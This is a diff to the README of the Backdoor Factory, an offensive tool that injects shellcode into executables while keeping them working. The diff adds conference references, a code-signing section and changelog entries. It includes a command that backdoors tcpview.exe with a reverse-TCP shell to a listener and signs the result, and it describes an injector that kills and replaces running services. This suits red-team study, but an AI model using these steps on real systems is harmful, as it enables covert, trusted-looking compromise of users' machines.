@@ -4,6 +4,12 @@ For security professionals and researchers only.
 
 The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.
 
+Black Hat USA 2015:
+
+    Video: https://www.youtube.com/watch?v=OuyLzkG16Uk
+    
+    Paper: https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf
+
 
 Shmoocon 2015:
     
@@ -50,8 +56,12 @@ See the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki
     sudo pip install capstone
 
 Pefile, most recent:
-https://code.google.com/p/pefile/
+    
+    https://code.google.com/p/pefile/
 
+osslsigncode (included in repo): 
+    
+    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/
 
 Kali Install:
 
@@ -212,7 +222,40 @@ Sample Usage:
     This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.
 
 ---
+###PEcodeSigning
 
+BDF can sign PE files if you have a codesigning cert. It uses osslsigncode.
+Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:
+http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html
+
+Put your private key password in a file (gasp) as so (exactly as so): 
+    
+    echo -n yourpassword > certs/passFile.txt
+
+Name your certs EXACTLY as follows:
+	
+    signingCert.cer => certs/signingCert.cer
+    signingPrivateKey.pem => certs/signingPrivateKey.pem
+
+Your certs/ directory should look excatly as so:
+    
+    certs
+    ├── passFile.txt
+    ├── signingPrivateKey.pem
+    └── signingCert.cer
+
+Enable PE Code Signing with the -C flag as so:
+
+     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C
+
+
+On successful run you should see this line in BDF output:
+
+    [*] Code Signing Succeeded
+
+
+
+---
 ###Hunt and backdoor: Injector | Windows Only
     The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
@@ -222,6 +265,29 @@ Sample Usage:
 ---
 
 ###Changelog
+
+####12/20/2015
+
+ * Added directory paths to BDF to find certs directory.
+
+
+####12/18/2015
+ * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning
+
+####11/17/2015
+
+ * Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header
+
+####11/13/2015
+  * Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching
+
+####10/19/2015
+  * Fixed bug in IAT directory cave assignment that caused BDF crash
+  * Made the feature optional with -A flag
+
+####10/13/2015
+   * Changed the Import Table Directory modifications from adding a new section to using an existing code cave
+
 
 ####08/12/2015
    * Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary
@@ -364,4 +430,3 @@ Added a new win86 shellcode: loadliba_reverse_tcp
   - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
 
 ---
-
